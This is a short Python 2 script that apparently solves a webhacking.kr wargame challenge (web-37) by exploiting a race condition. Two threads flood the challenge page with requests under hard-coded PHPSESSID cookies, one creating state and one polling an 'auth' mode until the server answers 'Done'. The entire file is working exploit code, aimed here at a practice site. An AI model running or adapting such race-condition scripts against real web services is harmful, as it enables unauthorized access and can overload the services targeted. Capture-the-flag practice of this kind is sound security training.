#-*- coding: utf-8 -*-
import sys
import threading
import urllib2

import CookieManager

createThread = None
def requestAuth():
    while True:
        challengeUrl = "http://webhacking.kr/challenge/web/web-37/index.php?mode=auth"
        CookieManager.addCookie("PHPSESSID", "aebaacacaaaaaabcaaaeadabafbccab")
        httpRequest = urllib2.Request(challengeUrl)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            sys.stdout.write("!")
            if httpResponse.find("Done") >= 0:
                print
                print "[!] Clear Challenge 60"
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

def requestCreate():
    while True:
        challengeUrl = "http://webhacking.kr/challenge/web/web-37/index.php"
        CookieManager.addCookie("PHPSESSID", "bfeeaffbabaebabaeababababfebeaba")
        httpRequest = urllib2.Request(challengeUrl)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            urllib2.urlopen(httpRequest)
            sys.stdout.write(".")
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

print "[*] Start race condition"
print "[*] create: ., auth: !"
print "Progress:",
createThread = threading.Thread(target=requestCreate)
authThread = threading.Thread(target=requestAuth)
createThread.start()
authThread.start()